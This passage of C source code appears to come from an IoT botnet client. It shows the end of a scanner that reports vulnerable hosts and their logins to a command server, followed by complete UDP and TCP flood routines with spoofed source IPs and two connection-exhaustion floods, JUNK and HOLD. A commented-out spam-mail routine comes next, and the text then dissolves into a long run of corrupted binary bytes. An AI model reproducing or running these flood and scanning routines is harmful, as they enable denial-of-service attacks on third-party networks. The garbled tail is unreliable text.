						sockprintf(mainCommSock, "REPORT %s:%s:", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd]);
						sockprintf(mainCommSock, "VULN FOUND!");
						memset(fds[i].sockbuf, 0, 1024);
						sclose(fds[i].fd);
						fds[i].complete = 1;
						fds[i].state = 0;
						continue;
					}
					else {
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 30 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;
                        }
                }
        }
}

//          ___  ___     ___ _                 _
//  /\ /\  /   \/ _ \   / __\ | ___   ___   __| |
// / / \ \/ /\ / /_)/  / _\ | |/ _ \ / _ \ / _` |
// \ \_/ / /_// ___/  / /   | | (_) | (_) | (_| |
//  \___/___,'\/      \/    |_|\___/ \___/ \__,_|

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
                        sockprintf(mainCommSock, "Failed opening raw socket.");
                    	//sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
                        sockprintf(mainCommSock, "Failed setting raw headers mode.");
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);

                        if(i == pollRegister)
                        {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
}

//  _____  ___   ___     ___ _                 _
// /__   \/ __\ / _ \   / __\ | ___   ___   __| |
//   / /\/ /   / /_)/  / _\ | |/ _ \ / _ \ / _` |
//  / / / /___/ ___/  / /   | | (_) | (_) | (_| |
//  \/  \____/\/      \/    |_|\___/ \___/ \__,_|

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                sockprintf(mainCommSock, "Failed opening raw socket.");
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                sockprintf(mainCommSock, "Failed setting raw headers mode.");
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                                sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}


//   __             __          ___ _                 _
//   \ \  /\ /\  /\ \ \/\ /\   / __\ | ___   ___   __| |
//    \ \/ / \ \/  \/ / //_/  / _\ | |/ _ \ / _ \ / _` |
// /\_/ /\ \_/ / /\  / __ \  / /   | | (_) | (_) | (_| |
// \___/  \___/\_\ \/\/  \/  \/    |_|\___/ \___/ \__,_|

void sendJUNK(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *watwat = malloc(1024);
        memset(watwat, 0, 1024);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        makeRandomStr(watwat, 1024);
                                        if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHOLD(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *watwat = malloc(1024);
        memset(watwat, 0, 1024);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                                        if(res != 0)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}

/*
//  __                _     __                _ _
// / _\ ___ _ __   __| |   /__\ __ ___   __ _(_) |
// \ \ / _ \ '_ \ / _` |  /_\| '_ ` _ \ / _` | | |
// _\ \  __/ | | | (_| | //__| | | | | | (_| | | |
// \__/\___|_| |_|\__,_| \__/|_| |_| |_|\__,_|_|_|

void sendEmail(unsigned char *email, unsigned char *host, unsigned char *subject, unsigned char *message)
{
                unsigned char buffer[1024];
                memset(buffer, 0, 1024);

                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if(!connectTimeout(fd, host, 25, 30)) { close(fd); return; }
                if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
                if(strstr(buffer, "220 ") == NULL) { close(fd); return; }

                if(send(fd, "HELO rastrent.com\r\n", 19, MSG_NOSIGNAL) != 19) { close(fd); return; }
                if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
                if(strstr(buffer, "250 ") == NULL) { close(fd); return; }
                memset(buffer, 0, 1024);

                if(send(fd, "MAIL FROM: <mrras@rastrent.com>\r\n", 33, MSG_NOSIGNAL) != 33) { close(fd); return; }
                if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
                if(strstr(buffer, "250 ") == NULL) { close(fd); return; }
                memset(buffer, 0, 1024);

                if(send(fd, "RCPT TO: <", 10, MSG_NOSIGNAL) != 10) { close(fd); return; }
                if(send(fd, email, strlen(email), MSG_NOSIGNAL) != strlen(email)) { close(fd); return; }
                if(send(fd, ">\r\n", 3, MSG_NOSIGNAL) != 3) { close(fd); return; }
                if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
                if(strstr(bzaÚJl2Ék/2(«’p%İº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæÏÄì©}_ÕìÒÏ–ó†Âİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæ7D•'²ùr9ù“ºÇAİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæÂñAºto{\ófgJ/,İº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæâØHåí2*ÇóS80Hİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæö%!¨g˜–õ:Ğ4ºBˆİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæÃ‡Ü5)«õ >‰Xİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæ4ã”õ˜ReîÔçd+ßáaİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæ9êÕI›p,	ÕÛí•xİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæxÒ ÌT÷hßàŒŒĞÇUİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİĞúÊ2kl¡•cë-CêËÎİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæİº€ä´z­îZ¯ÓãøÕæ*ÕHN¿ÄôÄ¤²c